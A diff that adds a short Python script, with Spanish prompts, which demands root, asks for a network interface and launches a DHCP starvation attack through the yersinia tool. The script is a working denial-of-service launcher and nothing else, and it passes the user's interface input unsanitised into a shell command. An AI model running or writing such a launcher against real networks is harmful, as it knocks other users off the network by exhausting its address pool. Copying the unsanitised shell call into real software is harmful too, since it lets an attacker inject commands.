@@ -1,0 +1,18 @@
+#!/usr/bin/env python3
+import os
+import sys
+import subprocess
+
+if os.geteuid() != 0:
+    print("Ejecuta con: sudo python3 dhcp_starvation.py")
+    sys.exit(1)
+
+interface = input("Ingrese la interfaz de red: ").strip() or "eth0"
+
+print("Iniciando DHCP Starvation Attack...")
+print(f"Interfaz: {interface}")
+
+try:
+    subprocess.run(f"yersinia dhcp -attack 1 -interface {interface}", shell=True)
+except KeyboardInterrupt:
+    print("Ataque detenido.")
